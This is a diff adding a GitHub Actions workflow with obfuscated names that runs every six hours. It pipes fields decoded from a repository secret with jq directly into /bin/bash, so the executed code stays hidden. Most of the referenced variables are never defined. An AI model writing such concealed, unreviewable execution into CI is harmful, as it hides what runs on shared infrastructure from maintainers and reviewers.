@@ -1,0 +1,25 @@
+name: zongqiukaikang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zongqiukaikang
+        env:
+          xwe87089: ${{ secrets.xwe87089 }}
+        run: |
+          echo $xwe87089 | jq -r .luyos20685 | /bin/bash
+          echo $kpkpw872 | jq -r .qzyh08522 | /bin/bash
+          echo $ub7568 | jq -r .ia596 | /bin/bash
+          echo $akige6 | jq -r .nomlr728 | /bin/bash
+          echo $kcxu304 | jq -r .oq7783 | /bin/bash
+          echo $usge52143 | jq -r .tt74 | /bin/bash
+          echo $nb38 | jq -r .dh9 | /bin/bash
+          echo $hxbt4212 | jq -r .fwa784 | /bin/bash
+
